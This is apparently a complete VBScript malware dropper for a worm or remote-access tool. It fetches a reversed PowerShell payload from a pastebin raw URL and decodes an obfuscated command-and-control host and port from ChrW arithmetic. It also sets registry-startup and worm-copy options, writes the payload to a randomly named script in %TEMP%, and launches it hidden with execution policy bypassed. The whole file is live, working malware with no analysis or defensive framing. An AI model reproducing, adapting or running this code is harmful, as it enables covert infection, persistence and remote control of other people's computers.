Dim S
S = StrReverse(GetURL("https:/" + "/pastebin" + ".com/raw" + "/4sEVfSqi"))
Dim Obj
Set Obj = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")
Dim Host, Port, Copyy, Dir, RegStartup, VBS, RegName, MtxText, CopyStartup
Host = ChrW(238 / 2 ) + ChrW(210 / 2 ) + ChrW(220 / 2 ) + ChrW(200 / 2 ) + ChrW(222 / 2 ) + ChrW(238 / 2 ) + ChrW(220 / 2 ) + ChrW(90 / 2 ) + ChrW(220 / 2 ) + ChrW(202 / 2 ) + ChrW(232 / 2 ) + ChrW(238 / 2 ) + ChrW(222 / 2 ) + ChrW(228 / 2 ) + ChrW(214 / 2 ) + ChrW(92 / 2 ) + ChrW(218 / 2 ) + ChrW(242 / 2 ) + ChrW(226 / 2 ) + ChrW(90 / 2 ) + ChrW(230 / 2 ) + ChrW(202 / 2 ) + ChrW(202 / 2 ) + ChrW(92 / 2 ) + ChrW(198 / 2 ) + ChrW(222 / 2 ) + ChrW(218 / 2 )
Port = ChrW(98 / 2 ) + ChrW(102 / 2 ) + ChrW(98 / 2 ) + ChrW(100 / 2 )
Copyy = "False"
Dir = ChrW(168 / 2 ) + ChrW(202 / 2 ) + ChrW(218 / 2 ) + ChrW(224 / 2 )
RegStartup = "True"
VBS = ChrW(208 / 2 ) + ChrW(222 / 2 ) + ChrW(230 / 2 ) + ChrW(232 / 2 ) + ChrW(92 / 2 ) + ChrW(236 / 2 ) + ChrW(196 / 2 ) + ChrW(230 / 2 )
RegName = ChrW(92 / 2 ) + ChrW(198 / 2 )
MtxText = "creylmobnexrpdkkitpcmlqdmaybirjfeacqyklyacokcinnbl"
CopyStartup = "False"
Function GetURL(URI)
Dim o
Set o = CreateObject("MSXML2.XMLHTTP")
o.open "GET", URI, False
o.send
GetURL = o.responseText
End Function
Sub CreateAfile
    Dim Cstring, CurrPath, PSScriptName
	PSScriptName = RandomString() & ".PS1"
	CurrPath = Obj.ExpandEnvironmentStrings("%TEMP%") & "\" & PSScriptName
    Set a = fs.CreateTextFile(CurrPath, True)
    Cstring = S
    a.WriteLine(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Replace(Cstring,"%HOST%", Host),"%PORT%", Port), "%MUTEX%", MtxText), "%RegistryName%", RegName), "%WormDirectory%", Dir), "%WormFileName%", VBS), "%RegUP%", RegStartup), "%CpStartup%", CopyStartup), "%ScriptPath%", Wscript.ScriptFullName), "%PSName%", PSScriptName))
    a.Close
    Obj.Run "powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -File " & CurrPath, 0, False
End Sub
function RandomString()
Dim intMax, iLoop, k, intValue, strChar, strName, intNum
Const Chars = "abcdefghijklmnopqrstuvwxyz0123456789"
intMax = 18
intNum = 20
Randomize()
    strName = ""
    For k = 1 To intMax
        intValue = Fix(26 * Rnd())
        strChar = Mid(Chars, intValue + 1, 1)
        strName = strName & strChar
    Next
    RandomString = strName
end function
CreateAfile()
